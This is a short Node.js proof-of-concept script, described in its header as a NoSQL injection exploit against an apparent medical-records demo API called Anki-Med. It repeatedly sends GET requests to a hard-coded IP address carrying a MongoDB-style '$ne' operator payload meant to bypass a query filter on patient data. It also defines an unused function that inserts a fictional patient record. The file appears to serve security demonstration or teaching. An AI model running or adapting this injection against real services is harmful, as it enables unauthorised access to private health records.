/*
 * NoSQL injection in Anki-Med
 * This PoC assumes that the Anki-Med Rec API is running on rizzo:3000
 * See the README file for pointers on how to start Anki-Med Rec API app.
 */

//Disable the proxy...

process.env['http_proxy'] = '';

var http = require('http');

function process_response (msg) {
    var rawData = 'Processing response for: ' + msg;
    return function (res) {
        res.on('data', function (chunk) {
            rawData += chunk;
        });
        res.on('end', function () {
            console.log(rawData + "\n");
        });
    };
}

function getQueryPayload(){
     var rand_m = Math.random();
     if(Math.floor(rand_m * 2) === 0)
        return 'val[$ne]=123';
    else
        return 'val=11111';
}


function sendQueryRequest(){
    //Query the DB with some NoSQL injection
    console.log("Querying ...\n")
    options = {
        hostname: '140.86.12.67',
        port: 3000,
        path: '/patients?m=mobile&' + getQueryPayload(),
        method: 'GET',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    };

    console.log("Request being sent is: " + options.path + "\n")
    req = http.request(options, process_response(options.method+" "+options.path+"\n"));
    req.on('error', (e) => {
        console.error(`problem with request: ${e.message}`);
    });
    req.end()
}

function sendInsertRequest() {
    options = {
        hostname: '140.86.12.67',
        port: 3000,
        path: '/patients',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    };
    req = http.request(options,
        process_response(
            options.method +
            " " + options.path +
            "\n"));
    req.on('error', function(e) {
        console.error(
            `problem with request: ${e.message}`
        );
    });

    //Insert a patient in the DB
    console.log(
        "Inserting John Mills in the DB...\n"
    );
    req.write(JSON.stringify({
        "Patients": [{
            "FullName": "John Mills",
            "Age": "65",
            "Address": "25 Grenfell St, 5000, Adelaide, SA, Australia",
            "Mobile": "61558755883",
            "Email": "jmills@medrec.com",
            "ContactMethod": "Email|SMS|VoiceCall|Carer"
        }]
    }));
    req.end();
}


function sendPayloads(){

    setInterval(sendQueryRequest, 5000);

}

sendPayloads();



